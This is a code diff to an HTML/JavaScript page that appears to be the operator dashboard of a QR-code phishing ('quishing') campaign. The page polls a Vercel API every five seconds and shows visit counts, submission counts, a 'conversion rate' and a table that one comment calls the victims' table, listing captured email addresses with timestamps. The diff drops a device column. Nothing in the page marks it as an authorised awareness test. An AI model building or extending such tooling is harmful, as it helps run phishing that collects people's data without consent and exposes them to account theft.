@@ -37,7 +37,6 @@
                     <tr>
                         <th>Hora</th>
                         <th>Email</th>
-                        <th>Dispositivo</th>
                     </tr>
                 </thead>
                 <tbody id="submissionsTableBody">
@@ -48,11 +47,9 @@
         <p><em>By Cyberdark</em></p>
     </div>
 
-    <script>
-    // URL de tu API de Vercel donde obtendremos las estadísticas
+   <script>
     const API_URL = 'https://quishing-ashy.vercel.app/api/get-stats';
 
-    // Función para obtener los datos más recientes del backend
     async function fetchStats() {
         try {
             const response = await fetch(API_URL);
@@ -64,53 +61,41 @@
         } catch (error) {
             console.error("No se pudieron obtener las estadísticas:", error);
             const tableBody = document.getElementById('submissionsTableBody');
-            tableBody.innerHTML = `<tr><td colspan="3" style="text-align:center; color:red;">Error al cargar los datos en vivo. Asegúrate de que el backend esté funcionando.</td></tr>`;
+            tableBody.innerHTML = `<tr><td colspan="2" style="text-align:center; color:red;">Error al cargar los datos en vivo. Asegúrate de que el backend esté funcionando.</td></tr>`;
         }
     }
 
-    // Función para actualizar la interfaz con los nuevos datos
     function updateDashboard(data) {
-        // Asumiendo que tu API devuelve un objeto como: { totalVisits: 50, totalSubmissions: 10, latestSubmissions: [...] }
         const { totalVisits, totalSubmissions, latestSubmissions } = data;
-
-        // Calcular estadísticas
         const conversion = totalVisits > 0 ? (totalSubmissions / totalVisits * 100) : 0;
 
-        // Actualizar el resumen
         document.getElementById('totalVisits').textContent = totalVisits || 0;
         document.getElementById('totalSubmissions').textContent = totalSubmissions || 0;
         document.getElementById('conversionRate').textContent = `${conversion.toFixed(1)}%`;
 
-        // Actualizar la tabla de víctimas
         const tableBody = document.getElementById('submissionsTableBody');
-        tableBody.innerHTML = ''; // Limpiar la tabla
+        tableBody.innerHTML = ''; 
 
         if (!latestSubmissions || latestSubmissions.length === 0) {
-            tableBody.innerHTML = '<tr><td colspan="3" style="text-align:center;">Aún no hay datos enviados.</td></tr>';
+            tableBody.innerHTML = '<tr><td colspan="2" style="text-align:center;">Aún no hay datos enviados.</td></tr>';
         } else {
-            // Tomar las últimas 10 (asumiendo que el backend ya las devuelve ordenadas)
             for (const submission of latestSubmissions) {
                 const row = document.createElement('tr');
-                
                 const time = new Date(submission.timestamp).toLocaleTimeString('es-ES', {
                     hour: '2-digit',
                     minute: '2-digit',
                     second: '2-digit'
                 });
-                
                 const email = submission.email;
-                const device = submission.device_info ? submission.device_info.deviceType : 'Desconocido';
 
-                row.innerHTML = `<td>${time}</td><td>${email}</td><td>${device}</td>`;
+                // --- CORRECCIÓN AQUÍ: Ya no se procesa ni se muestra el dispositivo ---
+                row.innerHTML = `<td>${time}</td><td>${email}</td>`;
                 tableBody.appendChild(row);
             }
         }
     }
-
-    // Llama a la función cuando la página cargue
+    
     window.onload = fetchStats;
-
-    // Actualiza las estadísticas cada 5 segundos
     setInterval(fetchStats, 5000);
 </script>
 </body>
